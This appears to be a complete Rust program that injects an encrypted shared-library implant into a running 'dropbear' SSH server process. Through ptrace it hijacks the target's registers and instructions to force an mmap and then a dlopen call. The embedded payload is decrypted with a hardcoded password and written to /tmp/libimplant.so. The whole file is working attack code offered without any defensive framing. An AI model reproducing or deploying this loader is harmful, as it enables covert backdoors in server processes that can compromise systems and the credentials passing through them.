use std::{thread, time};
use goblin::elf::Elf;
use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::Pid;
use proc_maps::{get_process_maps, MapRange};
use std::ffi::c_void;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use aes::Aes128;
use md5::{Md5, Digest};
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::fs::File;
use std::io::prelude::*;

/// Get MapRange for libc in target process
fn get_libc_map(pid: Pid) -> Option<MapRange> {
    // Get Process map
    let maps = get_process_maps(pid.into()).unwrap();
    for map in maps {
        if map.filename().is_some() && map.filename().unwrap().to_str().unwrap().contains("/libc.")
        {
            return Some(map);
        }
    }
    None
}

/// Find a offset of a given function in a given ELF file by resolving symbols
fn get_function_offset(filename: &str, function_name: &str) -> Option<u64> {
    // TODO: Implement for both dynsyms and syms
    let data = std::fs::read(filename).expect("Cant read libc!");
    let obj = Elf::parse(&data)
        .map_err(|_| "cannot parse ELF file")
        .unwrap();
    let symtab = obj.dynstrtab;
    for sym in obj.dynsyms.into_iter() {
        if (&symtab[sym.st_name]).eq(function_name) {
            return Some(sym.st_value);
        }
    }
    None
}

/// Lets target process call mmap() and writes so_path to the new page
fn write_path_to_process(pid: Pid, so_path: &str) -> u64 {
    // Attaching to process
    // Pauses process execution
    ptrace::attach(pid).unwrap();

    // Wait until process stops
    waitpid(pid, None).unwrap();

    // Get and save current register values of target process
    let mut regs = ptrace::getregs(pid).unwrap();
    let regs_saved = regs.clone();

    // Save instruction which will bi overwritten
    let saved_instruction = ptrace::read(pid, regs.rip as *mut c_void).unwrap();

    regs.rax = 9; // syscall for mmap()
    regs.rdi = 0;
    regs.rsi = so_path.len() as u64;
    regs.rdx = 5; // PROT_WRITE | PROT_READ
    regs.r10 = 0x22; // MAP_ANONYMOUS | MAP_PRIVATE
    regs.r8 = u64::MAX;
    regs.r9 = 0;

    // Overwrite registers
    ptrace::setregs(pid, regs).unwrap();

    // Overwrite instruction with syscall (0x50f)
    unsafe { ptrace::write(pid, regs.rip as *mut c_void, 0x50f as *mut c_void).unwrap() };

    // Execute mmap to map new page
    ptrace::step(pid, None).unwrap();
    waitpid(pid, None).unwrap();

    // Get address of new page
    let mut regs_updated = ptrace::getregs(pid).unwrap();
    let address = regs_updated.rax;

    // Restore registers
    ptrace::setregs(pid, regs_saved).unwrap();

    // Restore saved instruction
    unsafe {
        ptrace::write(
            pid,
            regs_saved.rip as *mut c_void,
            saved_instruction as *mut c_void,
        )
        .unwrap()
    };

    // Write padded string to new page
    let path_bytes = so_path.as_bytes();
    for chunk in path_bytes.chunks(8) {
        let mut padded_chunk = [0u8; 8];
        for (i, &byte) in chunk.iter().enumerate() {
            padded_chunk[i] = byte;
        }
        unsafe {
            ptrace::write(
                pid,
                regs_updated.rax as *mut c_void,
                u64::from_ne_bytes(padded_chunk) as *mut c_void,
            )
            .unwrap()
        };
        regs_updated.rax += 8;
    }

    ptrace::detach(pid, None).unwrap();

    // Return address of path in target process memory
    address
}

/// Lets target process call dlopen to load a shared object
fn call_dlopen(pid: Pid, p_dlopen: u64, p_so_path: u64) {
    // Attaching to process
    // Pauses process execution
    ptrace::attach(pid).unwrap();

    // Wait stops
    waitpid(pid, None).unwrap();

    // Get and save current register values of target process
    let mut regs = ptrace::getregs(pid).unwrap();
    let regs_saved = regs.clone();
    let saved_instruction = ptrace::read(pid, regs.rip as *mut c_void).unwrap();

    regs.rdi = p_so_path;
    regs.rsi = 1; // RTLD_LAZY
    regs.r9 = p_dlopen;

    ptrace::setregs(pid, regs).unwrap();

    // call r9; int 3  0xccd1ff41
    unsafe {
        ptrace::write(
            pid,
            regs_saved.rip as *mut c_void,
            0xccd1ff41 as *mut c_void,
        )
        .unwrap()
    };
    ptrace::cont(pid, None).unwrap();
    waitpid(pid, None).unwrap();

    ptrace::setregs(pid, regs_saved).unwrap();
    unsafe {
        ptrace::write(
            pid,
            regs_saved.rip as *mut c_void,
            saved_instruction as *mut c_void,
        )
        .unwrap()
    };
    ptrace::detach(pid, None).unwrap();
}

fn decrypt_payload(payload: &[u8], path: &str, pw: &str) {
    type Aes128Cbc = Cbc<Aes128, Pkcs7>;
    let mut hasher = Md5::new();
    hasher.update(pw);
    let key = hasher.finalize();
    let iv = &payload[0..16];
    let cipher = Aes128Cbc::new_from_slices(&key, &iv).unwrap();
    let mut buf = payload[16..payload.len()].to_vec();
    let so = cipher.decrypt(&mut buf).unwrap();
    let mut file = File::create(path).unwrap();
    file.write(so).unwrap();
}

fn main() {
    let so_path = "/tmp/libimplant.so";
    let ciphertext_file = include_bytes!("payload_enc.bin");
    
    // Get process id of target process
    let s = System::new_all();
    let pid = nix::unistd::Pid::from_raw(
        s.processes_by_exact_name("dropbear")
            .next()
            .expect("Process not found!")
            .pid()
            .as_u32()
            .try_into()
            .unwrap(),
    );

    // Get map range of libc mapped in target process
    let libc_map = get_libc_map(pid.into()).expect("libc map not found!");

    let dlopen_offset =
        get_function_offset(libc_map.filename().unwrap().to_str().unwrap(), "dlopen")
            .expect("Function not found");
    let p_dlopen = libc_map.start() as u64 + dlopen_offset;

    // Decrypt payload and write to disk
    decrypt_payload(ciphertext_file, so_path, "unleash_your_power");
    
    // Write path string to into target process address space
    let p_so_path = write_path_to_process(pid, &(so_path.to_owned() + "\x00"));

    // Call dlopen from target process
    call_dlopen(pid, p_dlopen, p_so_path);
}
